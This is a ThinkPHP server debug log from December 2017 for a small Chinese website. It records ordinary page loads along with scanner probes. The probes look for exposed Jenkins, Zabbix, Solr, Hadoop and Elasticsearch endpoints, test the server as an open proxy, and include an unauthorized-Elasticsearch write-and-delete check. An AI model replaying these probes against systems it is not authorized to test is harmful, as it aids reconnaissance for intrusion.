  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:22+08:00 ] 172.17.195.153 106.11.231.1 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.025944s][吞吐率：38.54req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:30+08:00 ] 172.17.195.153 106.11.228.195 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.023784s][吞吐率：42.05req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:31+08:00 ] 172.17.195.153 106.11.228.195 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024519s][吞吐率：40.78req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:33+08:00 ] 172.17.195.153 106.11.230.196 POST /ltwpemzfyuvo
[ log ] 39.106.4.226:80/ltwpemzfyuvo [运行时间：0.010804s][吞吐率：92.56req/s] [内存消耗：1,508.46kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ltwpemzfyuvo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '39.106.4.226:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '22',
)
[ info ] [ PARAM ] array (
  '{"aliyun":_"vulntest"}' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:33+08:00 ] 172.17.195.153 106.11.231.138 GET /ltwpemzfyuvo
[ log ] 39.106.4.226:80/ltwpemzfyuvo [运行时间：0.011898s][吞吐率：84.05req/s] [内存消耗：1,509.05kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ltwpemzfyuvo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '39.106.4.226:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:33+08:00 ] 172.17.195.153 106.11.228.126 DELETE /ltwpemzfyuvo
[ log ] 39.106.4.226:80/ltwpemzfyuvo [运行时间：0.011338s][吞吐率：88.20req/s] [内存消耗：1,508.70kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ltwpemzfyuvo',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '39.106.4.226:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:34+08:00 ] 172.17.195.153 106.11.228.195 GET /hwi/
[ log ] 39.106.4.226:80/hwi/ [运行时间：0.010880s][吞吐率：91.91req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hwi',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:44+08:00 ] 172.17.195.153 106.11.230.120 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024557s][吞吐率：40.72req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:52+08:00 ] 172.17.195.153 106.11.231.109 GET /master-status
[ log ] 39.106.4.226:80/master-status [运行时间：0.010931s][吞吐率：91.48req/s] [内存消耗：1,509.02kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'master-status',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:53+08:00 ] 172.17.195.153 106.11.231.109 GET /dfshealth.html
[ log ] 39.106.4.226:80/dfshealth.html [运行时间：0.011020s][吞吐率：90.74req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:56+08:00 ] 172.17.195.153 80.82.78.50 GET http://www.baidu.com/cache/global/img/gs.gif
[ log ] www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif [运行时间：0.011533s][吞吐率：86.71req/s] [内存消耗：1,508.71kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:57+08:00 ] 172.17.195.153 106.11.231.109 GET /http://39.106.4.226:8080
[ log ] 39.106.4.226:80/http://39.106.4.226:8080 [运行时间：0.012094s][吞吐率：82.69req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'http:',
    1 => '39.106.4.226:8080',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:57+08:00 ] 172.17.195.153 106.11.231.109 GET /http://39.106.4.226:8081
[ log ] 39.106.4.226:80/http://39.106.4.226:8081 [运行时间：0.011388s][吞吐率：87.81req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'http:',
    1 => '39.106.4.226:8081',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:58+08:00 ] 172.17.195.153 106.11.231.109 GET /http://39.106.4.226:8090
[ log ] 39.106.4.226:80/http://39.106.4.226:8090 [运行时间：0.011317s][吞吐率：88.36req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'http:',
    1 => '39.106.4.226:8090',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:26:59+08:00 ] 172.17.195.153 106.11.231.109 GET /clusters.jsf
[ log ] 39.106.4.226:80/clusters.jsf [运行时间：0.011404s][吞吐率：87.69req/s] [内存消耗：1,509.00kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'clusters.jsf',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:03+08:00 ] 172.17.195.153 106.11.231.109 GET /about/
[ log ] 39.106.4.226:80/about/ [运行时间：0.010985s][吞吐率：91.03req/s] [内存消耗：1,508.89kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'about',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:04+08:00 ] 172.17.195.153 106.11.231.109 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024330s][吞吐率：41.10req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:05+08:00 ] 172.17.195.153 106.11.231.109 GET /jenkins/
[ log ] 39.106.4.226:80/jenkins/ [运行时间：0.011645s][吞吐率：85.87req/s] [内存消耗：1,508.97kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'jenkins',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:06+08:00 ] 172.17.195.153 106.11.231.109 GET /zabbix/
[ log ] 39.106.4.226:80/zabbix/ [运行时间：0.011184s][吞吐率：89.41req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'zabbix',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:06+08:00 ] 172.17.195.153 106.11.231.109 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.023983s][吞吐率：41.70req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:07+08:00 ] 172.17.195.153 106.11.231.109 GET /solr/
[ log ] 39.106.4.226:80/solr/ [运行时间：0.011724s][吞吐率：85.30req/s] [内存消耗：1,508.91kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'solr',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:07+08:00 ] 172.17.195.153 106.11.231.109 GET /
[ log ] 39.106.4.226:80/ [运行时间：0.024746s][吞吐率：40.41req/s] [内存消耗：2,782.24kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:12+08:00 ] 172.17.195.153 106.11.231.109 GET /info
[ log ] 39.106.4.226:80/info [运行时间：0.010819s][吞吐率：92.43req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'info',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:29+08:00 ] 172.17.195.153 106.11.228.90 GET /warning
[ log ] 39.106.4.226:80/warning [运行时间：0.011215s][吞吐率：89.17req/s] [内存消耗：1,508.93kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'warning',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:33+08:00 ] 172.17.195.153 106.11.228.90 GET /pleasereadthis
[ log ] 39.106.4.226:80/pleasereadthis [运行时间：0.011666s][吞吐率：85.72req/s] [内存消耗：1,509.01kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'pleasereadthis',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:37+08:00 ] 172.17.195.153 106.11.228.90 GET /please_read/_search
[ log ] 39.106.4.226:80/please_read/_search [运行时间：0.011405s][吞吐率：87.68req/s] [内存消耗：1,509.33kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'please_read',
    1 => '_search',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:40+08:00 ] 172.17.195.153 106.11.228.90 GET /dfshealth.jsp
[ log ] 39.106.4.226:80/dfshealth.jsp [运行时间：0.010896s][吞吐率：91.78req/s] [内存消耗：1,509.02kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'dfshealth.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T20:27:40+08:00 ] 172.17.195.153 106.11.228.90 GET /hadoop/dfshealth.jsp
[ log ] 39.106.4.226:80/hadoop/dfshealth.jsp [运行时间：0.011208s][吞吐率：89.22req/s] [内存消耗：1,509.22kb] [文件加载：37]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'hadoop',
    1 => 'dfshealth.jsp',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'referer' => 'http://39.106.4.226/',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.8380378)',
  'host' => '39.106.4.226:80',
  'accept' => '*/*',
  'connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-12-22T23:28:30+08:00 ] 172.17.195.153 60.191.52.254 HEAD http://wap.ip138.com/
[ log ] wap.ip138.comhttp://wap.ip138.com/ [运行时间：0.023529s][吞吐率：42.50req/s] [内存消耗：2,780.91kb] [文件加载：50]
[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Java/1.8.0_77',
  'host' => 'wap.ip138.com',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
  0 => 'lunbo',
  1 => 'tuijian1',
  2 => 'tuijian2',
  3 => 'tuijian3',
  4 => 'tuijian4',
  5 => 'xilie',
  6 => 'pinzhi1',
  7 => 'pinzhi2',
  8 => 'pinzhi3',
  9 => 'news',
  10 => 'link',
  11 => 'simxilie',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
